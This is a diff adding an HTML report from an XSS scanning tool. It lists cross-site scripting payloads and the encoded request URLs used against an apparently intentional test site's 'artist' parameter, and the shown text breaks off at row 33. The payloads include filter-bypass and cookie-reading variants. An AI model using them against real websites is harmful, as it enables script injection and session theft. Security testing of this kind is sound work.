@@ -1,0 +1,1836 @@
+
+                <!DOCTYPE html>
+                <html>
+                <head>
+                    <style>
+            body {
+                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+                margin: 0;
+                padding: 20px;
+                background-color: #000;
+                color: #00ff00;
+            }
+            h1, h2 {
+                color: #00ff00;
+                text-align: center;
+            }
+            .header {
+                display: flex;
+                justify-content: space-between;
+                padding: 10px 20px;
+                border-bottom: 2px solid #00ff00;
+                margin-bottom: 20px;
+                background-color: #333;
+            }
+            .header .left a {
+                color: #00ff00;
+                font-size: 18px;
+                text-decoration: none;
+            }
+            .header .right {
+                color: #00ff00;
+                font-size: 18px;
+            }
+            table {
+                width: 100%;
+                border-collapse: collapse;
+                margin-top: 20px;
+                background-color: #000;
+            }
+            th, td {
+                border: 1px solid #00ff00;
+                padding: 10px;
+                text-align: left;
+            }
+            th {
+                background-color: #004400;
+                color: #00ff00;
+            }
+            tr:nth-child(even) {
+                background-color: #1a1a1a;
+            }
+            tr:hover {
+                background-color: #333;
+                transition: background-color 0.3s ease;
+            }
+            a {
+                color: #1e90ff;
+                text-decoration: none;
+            }
+            a:hover {
+                text-decoration: underline;
+            }
+            .payload {
+                color: #e67e22;
+                font-weight: bold;
+            }
+            img.zoomable {
+                height: 100px;
+                cursor: pointer;
+                transition: transform 0.3s ease-in-out;
+            }
+            img.zoomable:hover {
+                transform: scale(1.2);
+            }
+            .modal {
+                display: none;
+                position: fixed;
+                z-index: 1000;
+                padding-top: 60px;
+                left: 0;
+                top: 0;
+                width: 100%;
+                height: 100%;
+                overflow: auto;
+                background-color: rgba(0, 0, 0, 0.9);
+            }
+            .modal-content {
+                margin: auto;
+                display: block;
+                width: 80%;
+                max-width: 700px;
+            }
+            .close {
+                position: absolute;
+                top: 15px;
+                right: 35px;
+                color: #fff;
+                font-size: 40px;
+                font-weight: bold;
+            }
+            .close:hover, .close:focus {
+                color: #bbb;
+                cursor: pointer;
+            }
+        </style>
+                    <script src='https://cdnjs.cloudflare.com/ajax/libs/jspdf/2.4.0/jspdf.umd.min.js'></script>
+                    <script>
+            document.addEventListener('DOMContentLoaded', function() {
+                const rows = document.querySelectorAll('.report-row');
+                rows.forEach(row => {
+                    row.addEventListener('click', () => {
+                        row.classList.toggle('highlight');
+                    });
+                });
+
+                const modal = document.getElementById('modal');
+                const modalImg = document.getElementById('modal-image');
+                const images = document.querySelectorAll('.zoomable');
+                const span = document.getElementsByClassName('close')[0];
+
+                let timer;
+
+                images.forEach(image => {
+                    image.addEventListener('mouseover', function() {
+                        clearTimeout(timer);
+                        modal.style.display = 'block';
+                        modalImg.src = this.src;
+                    });
+
+                    image.addEventListener('mouseout', function() {
+                        timer = setTimeout(() => {
+                            modal.style.display = 'none';
+                        }, 2000);
+                    });
+                });
+
+                span.onclick = function() { 
+                    modal.style.display = 'none';
+                    clearTimeout(timer);
+                };
+
+                window.onclick = function(event) {
+                    if (event.target == modal) {
+                        modal.style.display = 'none';
+                        clearTimeout(timer);
+                    }
+                };
+
+                document.getElementById('download-pdf').addEventListener('click', downloadPDF);
+            });
+
+            function downloadPDF() {
+                const { jsPDF } = window.jspdf;
+                const doc = new jsPDF();
+                const elementHTML = document.getElementById('report-table').outerHTML;
+                const filename = document.getElementById('download-pdf').getAttribute('data-filename');
+                doc.html(elementHTML, {
+                    callback: function (doc) {
+                        doc.save(filename);
+                    },
+                    x: 10,
+                    y: 10,
+                });
+            }
+        </script>
+                </head>
+            
+                <body>
+                    <div class='header'>
+                        <div class='left'>
+                            <a href='https://www.linkedin.com/in/ibrahim-husi%C4%87-101430102/' target='_blank'>LinkedIn Profile of Ibrahim</a>
+                        </div>
+                        <div class='right'>
+                            <span>#IbrahimXSS Tool V3</span>
+                        </div>
+                    </div>
+                    <h1 class='report-title'>Report 06/19/2024 09:32</h1>
+                    <h2>Found: 234 items</h2>
+                    <button id='download-pdf' data-filename='report-2024_6_19_9_30_35_656.pdf'>Download as PDF</button>
+                    <table id='report-table'>
+                        <thead>
+                            <tr>
+                                <th>Index</th>
+                                <th>Image</th>
+                                <th>Payload</th>
+                                <th>Request</th>
+                            </tr>
+                        </thead>
+                        <tbody>
+                <tr class='report-row'>
+                    <td>1</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_35_445.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>%27%3E&#39;>&lt;script>alert(2);&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%2527%253E%27%3e%3cscript%3ealert(2)%3b%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%2527%253E%27%3e%3cscript%3ealert(2)%3b%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>2</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_35_503.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;!-->&lt;svg onload=alert(1)-->.asp</td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3c!--%3e%3csvg+onload%3dalert(1)--%3e.asp&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3c!--%3e%3csvg+onload%3dalert(1)--%3e.asp&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>3</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_35_485.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;svg onload=prompt(document.domain);>.html</td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3csvg+onload%3dprompt(document.domain)%3b%3e.html&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3csvg+onload%3dprompt(document.domain)%3b%3e.html&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>4</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_37_365.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;svg onload=&quot;confirm(7)&quot;></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3csvg+onload%3d%22confirm(7)%22%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3csvg+onload%3d%22confirm(7)%22%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>5</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_37_446.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>>&lt;script>alert(123)&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3e%3cscript%3ealert(123)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3e%3cscript%3ealert(123)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>6</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_37_595.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>%20&lt;body onload=alert(&quot;bingo&quot;)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%2520%3cbody+onload%3dalert(%22bingo%22)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%2520%3cbody+onload%3dalert(%22bingo%22)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>7</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_38_179.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;script>alert(1)&lt;/script>.asp</td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3ealert(1)%3c%2fscript%3e.asp&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3ealert(1)%3c%2fscript%3e.asp&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>8</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_38_221.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;svg/onload=alert(1);></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3csvg%2fonload%3dalert(1)%3b%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3csvg%2fonload%3dalert(1)%3b%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>9</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_38_524.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;svg onload=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3csvg+onload%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3csvg+onload%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>10</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_38_684.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;&#39;>&lt;svg/onload=confirm(666)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%22%27%3e%3csvg%2fonload%3dconfirm(666)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%22%27%3e%3csvg%2fonload%3dconfirm(666)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>11</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_38_832.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;script>eval(&#39;\x61lert(1)&#39;)&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3eeval(%27%5cx61lert(1)%27)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3eeval(%27%5cx61lert(1)%27)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>12</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_38_879.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;iframe>&lt;img title=&quot;&lt;/iframe>&lt;img src onerror=alert(1)>&quot;>&lt;/iframe></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3ciframe%3e%3cimg+title%3d%22%3c%2fiframe%3e%3cimg+src+onerror%3dalert(1)%3e%22%3e%3c%2fiframe%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3ciframe%3e%3cimg+title%3d%22%3c%2fiframe%3e%3cimg+src+onerror%3dalert(1)%3e%22%3e%3c%2fiframe%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>13</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_38_865.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img src=x:alert(alt) onerror=eval(src) alt=xss></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+src%3dx%3aalert(alt)+onerror%3deval(src)+alt%3dxss%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cimg+src%3dx%3aalert(alt)+onerror%3deval(src)+alt%3dxss%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>14</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_39_42.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>d1bvs&lt;/script>&lt;script>alert(`XSS`)&lt;/script>c579g</td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=d1bvs%3c%2fscript%3e%3cscript%3ealert(%60XSS%60)%3c%2fscript%3ec579g&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=d1bvs%3c%2fscript%3e%3cscript%3ealert(%60XSS%60)%3c%2fscript%3ec579g&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>15</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_39_795.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;script>prompt(1234)&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3eprompt(1234)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3eprompt(1234)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>16</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_40_661.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;script>location=&#39;javascript:alert\x281\x29&#39;&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3elocation%3d%27javascript%3aalert%5cx281%5cx29%27%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3elocation%3d%27javascript%3aalert%5cx281%5cx29%27%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>17</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_41_135.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;script>\u0061lert(1)&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3e%5cu0061lert(1)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3cscript%3e%5cu0061lert(1)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>18</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_41_443.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;img src=a onerror=alert(document.location)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cimg+src%3da+onerror%3dalert(document.location)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cimg+src%3da+onerror%3dalert(document.location)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>19</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_41_944.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;svg>&lt;script>123&lt;1>alert(123)&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3csvg%3e%3cscript%3e123%3c1%3ealert(123)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3csvg%3e%3cscript%3e123%3c1%3ealert(123)%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>20</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_42_200.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;img src=/x onerror=prompt(document.domain);></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cimg+src%3d%2fx+onerror%3dprompt(document.domain)%3b%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cimg+src%3d%2fx+onerror%3dprompt(document.domain)%3b%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>21</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_42_589.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>search?q=&lt;img/src/onerror=alert(`ibro`)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=search%3fq%3d%3cimg%2fsrc%2fonerror%3dalert(%60ibro%60)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=search%3fq%3d%3cimg%2fsrc%2fonerror%3dalert(%60ibro%60)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>22</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_42_740.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;iframe src=javascript&amp;colon;alert&amp;lpar;document&amp;period;location&amp;rpar;></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3ciframe+src%3djavascript%26colon%3balert%26lpar%3bdocument%26period%3blocation%26rpar%3b%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3ciframe+src%3djavascript%26colon%3balert%26lpar%3bdocument%26period%3blocation%26rpar%3b%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>23</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_43_316.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;textarea autofocus onfocus=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3ctextarea+autofocus+onfocus%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3ctextarea+autofocus+onfocus%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>24</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_43_442.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>http://www.&lt;script>alert(1)&lt;/script .com</td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=http%3a%2f%2fwww.%3cscript%3ealert(1)%3c%2fscript+.com&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=http%3a%2f%2fwww.%3cscript%3ealert(1)%3c%2fscript+.com&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>25</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_43_860.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;&lt;script>alert(document.cookie);//&lt;&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3c%3cscript%3ealert(document.cookie)%3b%2f%2f%3c%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3c%3cscript%3ealert(document.cookie)%3b%2f%2f%3c%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>26</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_44_38.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;iframe/onload=&#39;this[&quot;src&quot;]=&quot;javas&amp;Tab;cript:al&quot;+&quot;ert``&quot;&#39;;></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3ciframe%2fonload%3d%27this%5b%22src%22%5d%3d%22javas%26Tab%3bcript%3aal%22%2b%22ert%60%60%22%27%3b%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3ciframe%2fonload%3d%27this%5b%22src%22%5d%3d%22javas%26Tab%3bcript%3aal%22%2b%22ert%60%60%22%27%3b%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>27</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_44_171.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;&#39;>&lt;img src=q onerror=alert(1)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%22%27%3e%3cimg+src%3dq+onerror%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%22%27%3e%3cimg+src%3dq+onerror%3dalert(1)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>28</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_45_314.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&#39;\u003E&#39;\u0022>&lt;script>alert(2);&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%27%5cu003E%27%5cu0022%3e%3cscript%3ealert(2)%3b%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%27%5cu003E%27%5cu0022%3e%3cscript%3ealert(2)%3b%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>29</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_45_444.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>%00&lt;script>alert(1);&lt;/script></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%2500%3cscript%3ealert(1)%3b%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%2500%3cscript%3ealert(1)%3b%3c%2fscript%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>30</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_46_287.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>%00&quot;>&lt;img src=x onerror=alert`1`//</td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%2500%22%3e%3cimg+src%3dx+onerror%3dalert%601%60%2f%2f&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%2500%22%3e%3cimg+src%3dx+onerror%3dalert%601%60%2f%2f&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>31</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_46_557.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&quot;>&lt;img src=x onerror=prompt(&#39;document.domain&#39;);></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cimg+src%3dx+onerror%3dprompt(%27document.domain%27)%3b%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%22%3e%3cimg+src%3dx+onerror%3dprompt(%27document.domain%27)%3b%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>32</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_46_905.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;svg onx=() onload=(confirm)(document.cookie)></td>
+                    <td><a target='_blank' class='request-link' href='http://testphp.vulnweb.com/listproducts.php?artist=%3csvg+onx%3d()+onload%3d(confirm)(document.cookie)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)>'>http://testphp.vulnweb.com/listproducts.php?artist=%3csvg+onx%3d()+onload%3d(confirm)(document.cookie)%3e&amp;quot; &quot;ontoggle=alert(&quot;sh&quot;)&gt;</a></td>
+                </tr>
+            <tr><td colspan="4">&nbsp;</td></tr>
+                <tr class='report-row'>
+                    <td>33</td>
+                    <td><img src='/root/Desktop/ibrahimxss/build/linux-x64/screenshot/2024_6_19_9_30_46_951.png' alt='Screenshot' class='zoomable'/></td>
+                    <td class='payload'>&lt;img src=x onerror=alert(document.domain)></td>
